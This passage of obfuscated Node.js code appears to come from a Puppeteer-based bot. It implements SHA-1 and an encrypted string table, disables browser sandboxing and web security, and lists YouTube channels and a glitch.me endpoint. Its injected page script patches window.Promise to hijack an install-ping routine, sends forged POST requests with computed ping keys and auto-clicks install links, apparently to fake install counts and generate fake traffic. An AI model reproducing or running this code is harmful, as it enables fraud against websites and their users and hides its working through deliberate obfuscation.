                J[0x22e8 + 0x1763 * -0x1 + 0x7 * -0x1a3] = this['block'], J[K >> 0xd6a + -0x7e7 * -0x2 + 0x2 * -0xe9b] |= x[0x906 + -0x1d54 + 0x1451 & K], this['block'] = J[0x159a + -0x53 * 0x3a + -0xe * 0x32], K >= -0x88 * 0x1d + -0x2d2 + 0x939 * 0x2 && (this['hashed'] || this['hash'](), J[-0x15 * 0x1d3 + 0x2215 + -0x43a * -0x1] = this['block'], J[-0x1a19 + 0x6c * -0x5 + 0x1 * 0x1c45] = J[-0x22b2 + -0x9 * -0xff + 0x19bc] = J[-0x2 * 0xc01 + 0x3cd * 0x1 + -0x73 * -0x2d] = J[-0x26b5 + -0x23e4 + 0x4a9c] = J[-0xace * -0x1 + 0x489 + -0x1 * 0xf53] = J[-0x666 + -0xe26 * -0x1 + 0x7bb * -0x1] = J[0xb3 * 0x1f + 0x1 * 0x1709 + 0x2cb0 * -0x1] = J[-0x21b7 + 0x12b7 + 0xf07] = J[0x985 + -0x2133 + 0x5 * 0x4be] = J[-0xe43 + 0x1 * -0x1399 + 0x21e5] = J[0x2592 + 0x1 * -0x8c9 + -0x995 * 0x3] = J[-0xd * -0x2cb + -0x185f + -0xbe5] = J[0x7e0 + -0xa * 0x2c + -0x61c] = J[0x1ac9 * -0x1 + 0x22c7 + -0x7f1] = J[-0xf8b + 0x14b * 0x1b + 0x338 * -0x6] = J[0x4 * 0x450 + -0x977 * -0x1 + 0x2 * -0xd54] = 0x2 * -0x52e + -0x1fdf + 0x2a3b), J[-0x258a + 0x1 * 0x51b + 0x1 * 0x207d] = this['hBytes'] << -0x4e6 + 0x1 * 0xfd + 0x3ec | this['bytes'] >>> 0x3 * 0x7f + -0x2 * -0x71 + -0x22 * 0x11, J[0xf2d + 0xab6 + -0x6 * 0x44e] = this['bytes'] << -0x4 * -0x3cd + -0x1 * 0x1933 + 0xa02, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1eb * 0x1 + -0x99b + -0x5cb * -0x2; J < 0x121 * 0x1d + -0x134 * 0x1e + 0x3ab; ++J)
                K = Q[J - (0x5 * 0x108 + 0x98f * -0x3 + 0x5e2 * 0x4)] ^ Q[J - (0x3 * 0x40f + 0x2 * -0x569 + 0x71 * -0x3)] ^ Q[J - (-0x20 * 0x101 + -0x1ed6 * 0x1 + 0x6d * 0x94)] ^ Q[J - (0x1 * -0x1d31 + -0x14 * -0xdd + -0x5d * -0x21)], Q[J] = K << -0x2 * -0x493 + -0x1d3a + 0x1415 | K >>> 0xed7 + -0x1761 + 0x8a9;
              for (J = -0x454 + 0xe * -0x153 + 0x16de; J < -0x11 * -0x1d7 + 0x235 * -0xd + 0x282 * -0x1; J += 0x13 * -0x17e + 0x2110 + -0x4b1 * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x6ce + -0xb55 + 0x1228 | L >>> -0xea4 + -0x5 * 0x79c + 0x34cb) + (M & N | ~M & O) + P + (-0x2e4abf87 * -0x1 + -0x593446e + 0x1098ff8 * 0x30) + Q[J] << 0x3c5 + -0x756 + 0x391) << 0x11f * 0xb + -0x96d * 0x1 + -0x1 * 0x2e3 | P >>> -0x1a7 + 0x1 * -0x506 + 0x6c8) + (L & (M = M << 0x27 * 0x9f + -0x676 + -0x11a5 | M >>> -0x1 * -0x1288 + -0x6 * -0x121 + -0x194c) | ~L & N) + O + (0x4bf58730 + -0x1a2d4cbd + 0x28ba3f26) + Q[J + (-0x5a3 + 0x252a + -0x1f86)] << 0x805 * -0x2 + 0x1618 * -0x1 + 0x2622) << 0xf68 + 0x7 * -0x3 + -0xf4e | O >>> -0x2268 + 0x2374 + 0x1 * -0xf1) + (P & (L = L << -0x6d7 * 0x2 + -0x578 + -0x2 * -0x9a2 | L >>> -0x16c4 + 0x61 * 0x49 + -0x4e3) | ~P & M) + N + (-0x91c29 * 0x130a + -0x385c192 + -0xbd3 * -0x169f07) + Q[J + (0xb00 + 0x1 * -0x118d + 0x17 * 0x49)] << 0x105 * 0x7 + -0x7a * 0x2a + 0xce1) << -0x1956 + -0x3 * -0x85d + 0x44 | N >>> -0x161d * -0x1 + -0xb83 * 0x2 + 0x104 * 0x1) + (O & (P = P << 0xb16 + 0x1a6c + -0x4 * 0x959 | P >>> 0x1 * 0x201b + -0xf * -0x95 + -0x28d4) | ~O & L) + M + (-0x658aed70 + -0x1 * 0x5c011fe7 + 0x11c0e86f0) + Q[J + (0x1eff + -0x196 * -0x16 + -0x41e0)] << -0xa * -0xdb + 0x10d3 + -0x59 * 0x49) << -0x1bd * -0x1 + -0x121a * -0x1 + -0x13d2 | M >>> -0x1b3a + -0xd1f + 0x1 * 0x2874) + (N & (O = O << 0x1ff7 + -0x1 * -0x1a23 + 0x4 * -0xe7f | O >>> -0x4 * -0x50b + 0x1197 + -0x5 * 0x78d) | ~N & P) + L + (0xb24dddc1 + 0xa6d20ca5 * 0x1 + -0xfe9d70cd) + Q[J + (0x4 * 0x686 + 0xf4e + -0x2962)] << -0xa26 * 0x2 + -0x174c + -0x18 * -0x1d1, N = N << -0x2531 * -0x1 + 0x15e2 + -0x13a7 * 0x3 | N >>> -0x9 * 0x53 + 0xbfe + -0x911;
              for (; J < -0x1 * 0x397 + -0xcde + -0x1 * -0x109d; J += 0x53 * 0x3d + 0x21ad * -0x1 + 0x1fd * 0x7)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x19d + -0x64d * -0x5 + 0x1 * -0x2119 | L >>> 0x8ec + 0x809 + -0x10da) + (M ^ N ^ O) + P + (-0x2 * -0x3570a62f + 0x2ff58209 * 0x3 + -0x8be7e6d8) + Q[J] << 0xabf + 0x5 * -0x217 + 0x13 * -0x4) << 0x1834 + -0x79 * 0x17 + -0x6 * 0x238 | P >>> -0x1a10 + -0x11dc + 0x297 * 0x11) + (L ^ (M = M << 0x201b + -0x1 * 0xd1 + -0x1f2c | M >>> 0xe64 + 0x472 * -0x4 + 0x366) ^ N) + O + (0x379c4f01 * 0x1 + 0xd00dd6dc + 0x1a93849 * -0x5c) + Q[J + (0x1c9c + 0x1575 + -0x3210)] << -0x7f * -0xd + 0x1 * -0x1ff5 + -0x51a * -0x5) << 0xdce + 0x3ce + 0x3 * -0x5dd | O >>> -0xb27 * 0x2 + -0xa12 * -0x1 + 0xc57) + (P ^ (L = L << 0x1e8a + 0x239e + -0x420a | L >>> -0x796 + -0xa25 + 0x1 * 0x11bd) ^ M) + N + (0xd84ec529 + 0x193964cf + -0x82ae3e57) + Q[J + (0x1654 + -0x1ea9 * 0x1 + 0x857)] << 0x4bd + 0x2e0 + 0x79d * -0x1) << 0x2629 * 0x1 + -0x1 * 0xeb0 + 0x1 * -0x1774 | N >>> -0xb * 0x8e + -0x3 * -0x3f0 + 0x23 * -0x29) + (O ^ (P = P << -0x6f8 + -0x236 + 0x94c * 0x1 | P >>> -0x3 * 0x6a3 + -0x6b * 0x5d + 0x3aca) ^ L) + M + (0x7e8e7d5e + -0x1 * 0x487a303 + -0xb2ceeba) + Q[J + (0x10 * -0x131 + 0x1d4d + 0x176 * -0x7)] << -0x269d + 0xa86 + 0x1c17) << 0x23e + 0x1 * 0x123 + -0x35c | M >>> 0x128 * 0xe + 0x47 + -0x3 * 0x574) + (N ^ (O = O << 0x26f6 + 0xd35 + -0x340d | O >>> 0x2cf * 0x2 + 0x5 * 0x55d + -0x3 * 0xacf) ^ P) + L + (0x60ab801d + -0x81a875ac + -0xdb2f0e * -0xa8) + Q[J + (0x25 * 0x3d + 0x16b * 0x4 + 0xe79 * -0x1)] << -0x4 * -0x7f1 + 0x108d * -0x1 + 0x5 * -0x30b, N = N << 0x1a08 + 0x1 * 0x293 + -0x27 * 0xbb | N >>> 0x2030 + -0x1 * 0x13f1 + -0xc3d;
              for (; J < -0x19e6 + -0x1 * 0x1d33 + 0x3755; J += 0x1440 + 0x1dd + -0x1618)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xace + 0x1 * 0x195a + -0x2423 | L >>> 0xd7 * 0x3 + -0x2cf + 0x65) + (M & N | M & O | N & O) + P - (-0x94779c2 + 0x13f8ff1 * -0x3d + 0xc6510953 * 0x1) + Q[J] << 0x164d + 0x23f9 * -0x1 + 0xe * 0xfa) << -0xd9 * 0x13 + -0x5 * -0xa0 + 0xd00 | P >>> 0x131d * -0x2 + -0x1 * 0x210d + 0x4762) + (L & (M = M << -0x8da + 0x11 * -0x217 + 0x2c7f | M >>> 0x1 * 0x1f6a + 0xe7c + -0x2de4) | L & N | M & N) + O - (0x5ab * -0x173a73 + -0x109aa4 * 0x778 + 0x1 * 0x1708f85d5) + Q[J + (-0x1b2c + -0x12d * -0x5 + -0xaa6 * -0x2)] << 0x4 * -0x15 + -0x61 * 0x4e + -0xe1 * -0x22) << 0x1 * -0x2007 + 0x4df * -0x2 + 0x29ca | O >>> -0x11a8 + -0x1 * 0xedd + -0x1 * -0x20a0) + (P & (L = L << 0x1 * 0x23b + 0x34b * -0x4 + 0xb0f | L >>> 0x1efd + 0x1802 + -0x7 * 0x7db) | P & M | L & M) + N - (0x43 * 0x100597f + 0x624c37b0 + 0x225f2f * -0x187) + Q[J + (-0x473 + -0x1 * 0x20b1 + -0x13d * -0x1e)] << -0x24d4 * -0x1 + -0x2696 + -0x4b * -0x6) << 0x1dd1 + 0x2425 + -0x41f1 | N >>> -0x20cf + 0x2b * -0x5 + 0x21c1) + (O & (P = P << 0x214d + 0x11e6 + -0x9 * 0x5ad | P >>> 0x186f + -0x1 * 0x1389 + -0x1 * 0x4e4) | O & L | P & L) + M - (0xca30626e + 0x75 * 0x9c4e90 + -0xa0bc071a) + Q[J + (0x119 * 0x1 + 0x6 * 0x542 + 0x1051 * -0x2)] << -0x17c * 0x12 + 0x1 * -0x701 + 0x59 * 0x61) << -0x10f * 0x24 + 0x1 * -0x14b + 0x276c | M >>> 0x31 * -0x71 + 0x1a2d + 0x1 * -0x471) + (N & (O = O << 0x1ae * 0x4 + 0x2641 + -0x2cdb | O >>> 0x2522 + -0x1427 + 0x4f * -0x37) | N & P | O & P) + L - (-0xa15ad2e6 + 0x5274dbf8 + 0xbfca3a12) + Q[J + (0x648 + 0xc70 + -0x12b4)] << -0x2431 + -0x5 * 0x719 + 0x23d7 * 0x2, N = N << -0x1827 + 0x19f * -0x9 + 0x26dc | N >>> -0x2575 + 0xd08 + 0x186f;
              for (; J < -0x1 * 0x2305 + 0x1 * 0xf68 + 0x13ed; J += -0x1a * -0xe8 + -0x163f + -0x1 * 0x14c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1195 + 0x1b * 0xad + -0x23cf | L >>> -0xf * -0x22d + -0xd1f + -0x1 * 0x1369) + (M ^ N ^ O) + P - (-0xd92887c + 0x207 * 0x34e6a + 0x3c7bcdc0) + Q[J] << 0xf8e * -0x1 + -0x8 * -0x18 + 0xece * 0x1) << -0x137 * 0x6 + 0x3 * -0xb2b + 0x28d0 | P >>> 0x1841 + -0x8d3 + -0xf53) + (L ^ (M = M << 0x371 * -0x1 + -0x2b * 0xc2 + 0x2425 | M >>> -0xc * 0x2c2 + -0x2291 + 0x11 * 0x3fb) ^ N) + O - (0x18ab821a + -0x43 * -0x10929c8 + 0x1675 * -0x1cd28) + Q[J + (0x25b7 * -0x1 + 0x7 * 0x587 + -0xf9)] << -0x66d + 0x1 * 0x24b5 + 0x26 * -0xcc) << -0xa91 + 0x116 + 0x20 * 0x4c | O >>> 0x25ce + -0x48f * -0x8 + -0x4a2b) + (P ^ (L = L << -0x250c + -0xe * 0x2 + 0x2546 | L >>> 0x1c5 + -0x28 * 0xda + 0x204d) ^ M) + N - (0x4f68a9 * -0x140 + 0x519c41 * -0xd3 + 0xdc23dafd) + Q[J + (-0x1e92 + -0x365 + 0x21f9)] << 0xe44 * 0x1 + -0x25 * 0xd7 + -0xd * -0x14b) << -0x32 * -0xb6 + -0xd15 + -0x1672 | N >>> -0x9 * -0x5d + -0x146 * 0x15 + -0x4 * -0x5e5) + (O ^ (P = P << 0xc98 + -0x1bc5 + 0xf4b | P >>> 0xcb * 0x27 + 0x1 * 0x1c31 + 0x123 * -0x34) ^ L) + M - (0x1aeab35d + 0xa50fd * -0x76b + -0x2 * -0x339ca7c6) + Q[J + (-0xf3c + 0x228b + 0x5f * -0x34)] << 0x3d1 + 0x837 + -0xc08) << 0xba3 + 0x1cf * -0x3 + -0x631 | M >>> -0x1ed7 + 0x733 + -0x17bf * -0x1) + (N ^ (O = O << -0xfd1 * -0x2 + -0x1 * -0x321 + -0x22a5 | O >>> 0x344 + 0x69d * 0x2 + -0x107c) ^ P) + L - (0x3e04e33b + -0x91dc2a6 + 0xb61d95) + Q[J + (-0x4 * -0x6c7 + 0x47 * 0x20 + -0x23f8)] << -0x852 + -0xfca + -0x607 * -0x4, N = N << -0x7fd + 0x12 * -0xb2 + 0x149f * 0x1 | N >>> -0x683 * 0x5 + 0x1466 + 0x23 * 0x59;
              this['h0'] = this['h0'] + L << 0x30d * -0x6 + 0x14c8 + -0x27a, this['h1'] = this['h1'] + M << 0xb * -0x9f + -0x155c + 0x1c31, this['h2'] = this['h2'] + N << -0xe22 + 0xf4d * -0x2 + 0x2cbc, this['h3'] = this['h3'] + O << 0x16f * 0x4 + 0x1e7c + 0xf4 * -0x26, this['h4'] = this['h4'] + P << 0x24f7 + -0x7 * -0x482 + 0x9 * -0x79d;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1022 * 0x2 + -0x1 * 0x575 + -0x1ab3 & 0x37d * 0x5 + 0x720 + -0x1882 * 0x1] + w[J >> 0xdc7 * 0x2 + -0x8cd + -0x12a9 & 0xdf2 + -0x7 * 0x3df + 0xd36] + w[J >> 0x652 + -0x7 * 0x44 + -0x16 * 0x33 & 0x95c + -0x10c3 + -0x5 * -0x17e] + w[J >> -0xc * -0x1c4 + 0x870 + 0x16 * -0x158 & 0x14d7 + 0x2 * -0xf7 + -0x12da] + w[J >> 0x16a1 + -0x11b2 + -0x4e3 & -0x2 * -0x4e1 + -0x1aab * -0x1 + 0x1 * -0x245e] + w[J >> 0x2556 + -0xd07 + -0x1847 & 0x262d + 0x1cb0 + -0x42ce] + w[J >> 0xb8 * -0x2a + 0x2485 + 0x21 * -0x31 & -0x1de3 + -0x35 * 0x65 + 0x2f * 0x115] + w[0xa * 0x98 + -0x25de + 0x1ffd & J] + w[K >> -0xba3 * -0x3 + -0x35 * 0x8e + -0x567 & -0x1ca6 + 0x1 * 0x132e + 0x987] + w[K >> 0x1 * 0x19c9 + 0x3b9 + -0x1d6a & -0x21d3 + -0x1e34 + -0x1 * -0x4016] + w[K >> 0x205b + 0x127 + 0x16 * -0x185 & -0x454 + -0x19ff + 0x1e62] + w[K >> 0xfaf + 0x21c5 + 0x4 * -0xc59 & 0x220e + 0x1c9b + -0x3 * 0x14de] + w[K >> 0x432 + -0x245b + 0x2035 & 0x1615 * -0x1 + -0x34 * 0x73 + 0x2d80] + w[K >> -0xd5b + -0x1 * 0x2025 + 0x5e * 0x7c & -0x182e + -0x1432 + 0x2c6f] + w[K >> 0x13 * 0x1fd + 0x21f1 + -0x47b4 & 0x887 + -0x1 * 0x7a5 + 0xd3 * -0x1] + w[-0x1 * -0x26e5 + 0x9b * 0x5 + -0x29dd & K] + w[L >> -0x185a * 0x1 + -0x1f12 + -0x8 * -0x6f1 & -0x1531 + 0x19 * 0xa3 + 0x555 * 0x1] + w[L >> -0x1b86 + 0x2 * -0x665 + 0x2 * 0x1434 & 0x119f + 0x11c1 + -0x2351] + w[L >> 0x2500 + 0x5f7 + -0x2ae3 & 0xb04 + 0x1098 + -0x3 * 0x92f] + w[L >> 0x196a + 0x11c7 + -0x3d * 0xb5 & -0x1 * 0x20a7 + 0x224e + 0x3 * -0x88] + w[L >> 0x1af + 0x4bf + -0x2 * 0x331 & -0x78b + -0xdeb * 0x2 + 0x7 * 0x510] + w[L >> -0x1 * -0x263b + 0x1970 + -0x3fa3 & 0x1c47 + 0xf4d + -0x2b85] + w[L >> -0x1 * 0x587 + -0xbb7 * -0x2 + -0x11e3 & -0x232e + 0x1763 * -0x1 + 0x20 * 0x1d5] + w[-0xbce + 0x6a9 + 0xde * 0x6 & L] + w[M >> 0x1b79 + 0xf43 + -0x2aa0 & -0xb3d + 0x1c2c + -0x50 * 0x36] + w[M >> 0x1 * -0x26ef + -0x1a0 * -0x16 + -0x347 * -0x1 & -0x27 * -0xcf + 0x8 * -0x95 + 0x1ad2 * -0x1] + w[M >> 0x34 * 0xa9 + -0xf1 * -0x1d + -0x3d8d & 0x1 * 0x1c6a + 0x211c + -0x3d77] + w[M >> -0x20c3 + -0x1c2d * 0x1 + -0x1e80 * -0x2 & 0xa3 * 0xd + -0x1aa5 + 0x1 * 0x126d] + w[M >> -0x7 * -0xb1 + -0xa * 0x3d7 + 0x4cd * 0x7 & -0x1 * 0x913 + 0x1 * -0x24fb + -0x3 * -0xf5f] + w[M >> -0xc6 * -0x4 + 0x1250 + -0x1560 * 0x1 & 0x180b + -0x1014 + 0x2 * -0x3f4] + w[M >> 0x1012 + 0x5 * -0x3df + -0xd * -0x41 & -0x1b5b + -0x3 * 0xc0 + 0x1 * 0x1daa] + w[-0x1 * 0xaa7 + -0x1ff * 0x3 + -0x13 * -0xe1 & M] + w[N >> -0x4 * -0xd7 + 0xc61 + -0xfa1 & -0x8f2 + -0x1c08 + 0x2509] + w[N >> -0x123 * 0xd + -0x1923 + 0x2802 & -0x1116 + 0x1547 + -0x422 * 0x1] + w[N >> 0x1 * 0x52d + -0xd00 + 0x11 * 0x77 & -0x1f5d + -0x1779 + 0xd * 0x439] + w[N >> -0x23bd + -0x1 * -0x69d + 0x10 * 0x1d3 & -0x11 * 0x205 + 0xeb * 0xe + 0x158a] + w[N >> -0x1b29 * -0x1 + 0x247e + -0x3f9b & 0x10ce + -0x1 * -0x30a + 0x13c9 * -0x1] + w[N >> -0x36f + 0xb3e + 0xb5 * -0xb & -0xce1 + 0x2068 + -0x1378] + w[N >> 0x1 * -0x139 + 0xdaf + -0xc72 & 0xb8f + 0xae2 + -0x1662] + w[0xbcb + -0x16 * 0x18a + -0x30 * -0x76 & N];
            }
            [V(0x4, '4GH%')]() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x218c + -0xdb8 + -0x3 * 0x694 & 0x3 * -0x9cf + -0x10ce + 0x179d * 0x2,
                J >> 0x150f + -0x21c1 + 0xcc2 & 0x205 * 0x9 + 0xf70 + -0x209e,
                J >> -0x17a + -0x5ed * -0x5 + -0x1c1f & -0x231 + -0x1 * 0x176e + 0x1 * 0x1a9e,
                0x11d * 0xe + -0x1c9 * 0x6 + 0x14b * -0x3 & J,
                K >> 0x3 * 0x26b + -0x1e32 + 0x1709 & -0x244d + 0x1b17 + 0xa35,
                K >> 0x1c20 + -0x1936 + -0x2da & 0x1eb8 + 0x1bf1 + -0x79 * 0x7a,
                K >> 0x10d8 + -0x2de * -0x5 + -0xa62 * 0x3 & -0x1453 + -0x1 * -0x1157 + 0x3fb,
                0x2f * 0x17 + 0x67 * 0x1 + -0x1 * 0x3a1 & K,
                L >> 0x1 * 0x1a1b + -0x16c4 + -0x33f & -0x8c9 + 0x15eb * 0x1 + 0x1 * -0xc23,
                L >> 0x53 * -0x3d + -0x5 * 0x642 + 0x3321 & -0x225b + 0xc01 + 0x8b * 0x2b,
                L >> -0x2d6 + -0x94 * -0x14 + -0x9f * 0xe & 0x3 * 0xcbf + -0x137d + -0x11c1,
                0xa8 * 0x10 + -0x6f * -0x19 + -0x1458 & L,
                M >> 0x5dd + 0x1 * -0x1337 + 0xd72 & -0xab7 + 0x793 * 0x5 + 0x1a29 * -0x1,
                M >> -0x1a8b * -0x1 + -0x2615 * -0x1 + -0x4090 & 0x9f0 + 0x358 + -0x55 * 0x25,
                M >> -0x62 * 0x11 + -0x21e7 * -0x1 + -0x1b5d * 0x1 & -0x2322 + -0x1 * -0x209b + -0x1c3 * -0x2,
                -0x1 * -0x24f3 + 0x1313 + 0x3707 * -0x1 & M,
                N >> 0xd99 * 0x2 + 0x1 * 0x24c1 + -0x3fdb & -0x1 * -0x1d48 + -0xc * -0x55 + -0x2045,
                N >> 0x1 * 0x153b + -0x10a9 + 0x1 * -0x482 & -0x39d + -0x2d9 * 0x9 + -0x1 * -0x1e3d,
                N >> -0x16e8 + 0x16a * -0x6 + 0x1f6c & 0x25f7 * 0x1 + -0xb36 + -0x9d * 0x2a,
                -0x2e7 + 0x158a + 0x469 * -0x4 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              const X = c,
                W = b;
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1a56 * 0x1 + 0x1f1a + -0xe57 * 0x4), (K = new DataView(J))['setUint32'](0x2513 + -0x1da0 + 0x773 * -0x1, this['h0']), K[W(0x3, 'EiHS')](0x8e * 0x35 + -0x83 * -0x41 + 0x1d * -0x229, this['h1']), K['setUint32'](-0xd22 + -0x6 * -0x414 + 0xb4e * -0x1, this['h2']), K['setUint32'](0x1 * 0x218 + 0x4c4 + -0x368 * 0x2, this['h3']), K[X(0x5)](0x164b * 0x1 + 0x6 * 0x668 + -0x3cab, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x23e1 + 0xd3b + -0x311c];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x1d1e + 0x1a61 + 0x377f * -0x1;
            J[-0x2ec + -0x2 * -0x20a + -0x128]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0xf4c + -0x1 * 0xa7c + -0x268 * 0x2] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0xd72 * -0x1 + 0x54f + 0x4 * 0x209), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x18c6 + 0x1e2e * 0x1 + -0x567;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x9ff + -0xd * 0x18e + 0x1013), Promise['resolve'](0x1c9 + -0x1c96 + 0x1ace);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1 * 0xeb6 + 0x20e * 0x11 + -0x423 * 0xc; j < -0x37 * 0xb5 + -0xec5 + 0x35a9; j++)
    i();
}
const NETWORK_PATIENCE = 0x3 * 0x12c6 + -0x390 + -0x2 * 0xac1 + (-0x26 * 0x13 + 0x112 + 0xd78) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x4a * 0x53 + -0x178d + -0x6e) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1585 + -0x5 * 0x1d1 + 0x1 * 0x1e9a);
    let h = e[f];
    if (b['CUVIIw'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x487 * -0x3 + 0x2226 * -0x1 + 0x2fbb * 0x1, s, t, u = -0x2 * 0x3f5 + 0x12e + 0x6bc; t = n['charAt'](u++); ~t && (s = r % (-0x11b * 0xe + 0x14ea * 0x1 + 0x1 * -0x56c) ? s * (-0x65d + 0x895 + 0x3 * -0xa8) + t : t, r++ % (-0x1 * -0x38 + -0x45 * 0x1 + -0x1 * -0x11)) ? p += String['fromCharCode'](0x1 * 0x22e7 + -0x17aa + 0x17 * -0x72 & s >> (-(0x5 * -0x4e7 + 0x175 * 0x16 + -0x3 * 0x283) * r & -0x1 * 0xf7f + -0x9 * 0x137 + -0x69d * -0x4)) : 0x25 * 0xe9 + 0x4 * 0x7fa + -0x67 * 0xa3) {
          t = o['indexOf'](t);
        }
        for (let v = 0x1 * -0x13b2 + 0x1e * 0x30 + -0x709 * -0x2, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1 * 0x1741 + 0xa5 * 0x6 + 0x1373))['slice'](-(0x1362 * 0x2 + -0x9bd * 0x3 + -0x98b));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x623 * 0x3 + 0x1 * -0xf35 + 0x296 * 0xd,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0xb77 * 0x1 + 0x2 * 0x191 + -0xe99 * 0x1; u < -0x11 * 0x21a + 0xbb * 0x25 + 0x9b3; u++) {
          p[u] = u;
        }
        for (u = -0x1b93 + 0x1 * -0x1ee5 + 0x3a78; u < -0x1ca5 + 0x1 * -0x99b + -0x4 * -0x9d0; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1574 * 0x1 + 0x1a * 0x13f + 0x86 * -0x13), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0xaa8 + 0xd1a + 0x2 * -0x139, q = -0x1 * -0x1976 + -0x30 * 0xad + 0x6fa;
        for (let v = 0x1572 + -0xa54 * 0x1 + -0xb1e; v < n['length']; v++) {
          u = (u + (-0x1 * 0xfa3 + -0x23d7 * 0x1 + -0x23d * -0x17)) % (0x1d20 + 0x251c + -0x209e * 0x2), q = (q + p[u]) % (-0x13df * 0x1 + -0x166 * -0xd + 0x2b1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1 * 0x1cd + -0x15a8 + 0x14db)]);
        }
        return t;
      };
      b['IIlrjU'] = m, c = arguments, b['CUVIIw'] = !![];
    }
    const j = e[0x98 * 0xb + -0x7f * -0x7 + -0x1 * 0xa01],
      k = f + j,
      l = c[k];
    return !l ? (b['laJuwN'] === undefined && (b['laJuwN'] = !![]), h = b['IIlrjU'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x710 + -0x1f4b + -0x1 * -0x183b; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
